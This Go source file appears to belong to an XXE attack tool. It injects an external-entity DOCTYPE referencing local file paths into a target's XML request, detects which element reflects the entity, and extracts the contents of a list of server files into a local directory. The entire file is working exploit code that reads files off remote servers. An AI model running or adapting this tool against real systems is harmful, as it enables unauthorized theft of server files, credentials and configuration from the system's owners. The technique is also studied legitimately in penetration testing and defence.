package xxe

import (
	"bytes"
	"encoding/xml"
	"fmt"
	"regexp"

	str "strings"
)

func (p *ParamsT) DirectTest() error {
	fmt.Println("testing...")

	leafName, err := p.DirectDetectLeaf()
	if err != nil {
		return err
	}

	if leafName == "" {
		return fmt.Errorf("can't find direct XXE injection")
	}

	for _, file := range p.Files {
		fmtS := `<!DOCTYPE root [<!ENTITY ext SYSTEM "file:///%s"> ]>`
		entity := fmt.Sprintf(fmtS, file)

		reqXml := str.Replace(p.XmlData, "?>", "?>"+entity, 1)

		content, err := p.getFileContent(file, reqXml, leafName)
		if err != nil {
			return err
		}

		if content != "" {
			locFile := makeLocalPath(p.OutDir, file)
			err = saveFile(locFile, content, false)
			if err != nil {
				return err
			}
		}
	}

	return nil
}

func (p *ParamsT) DirectDetectLeaf() (string, error) {
	var n NodeT
	err := p.XmlDecoder.Decode(&n)
	if err != nil {
		return "", err
	}

	var leafs []LeafT
	walkNodes([]NodeT{n}, func(n NodeT) bool {
		decTest := xml.NewDecoder(bytes.NewBuffer(n.Content))
		var nTest NodeT
		err = decTest.Decode(&nTest)
		if err != nil {
			leaf := LeafT{Name: n.XMLName.Local,
				Value: string(n.Content)}
			leafs = append(leafs, leaf)
		}

		return true
	})

	for _, file := range p.Files {
		fmtS := `<!DOCTYPE root [<!ENTITY ext SYSTEM "file:///%s"> ]>`
		entity := fmt.Sprintf(fmtS, file)

		reqXml := str.Replace(p.XmlData, "?>", "?>"+entity, 1)

		for _, leaf := range leafs {
			content, err := p.getFileContent(file, reqXml,
				leaf.Name)
			if err != nil {
				return "", err
			}

			if content != "" {
				return leaf.Name, nil
			}
		}
	}

	return "", nil
}

func (p *ParamsT) getFileContent(file, reqXml, leafName string) (string, error) {
	exp := fmt.Sprintf("(<%s>).*(</%s>)", leafName, leafName)
	re := regexp.MustCompile(exp)

	sep := str.Repeat("-=x=", 15) + "-"
	replStr := fmt.Sprintf("${1}\n%s&ext;%s\n${2}", sep, sep)
	reqXmlMod := re.ReplaceAllString(reqXml, replStr)

	body, err := makeRequest(p.Url, reqXmlMod, p.Cookie, p.OutDir)
	if err != nil {
		return "", err
	}
	if str.Contains(body, sep) {
		bodyFields := str.Split(body, sep)
		return bodyFields[1], nil
	}
	return "", nil
}
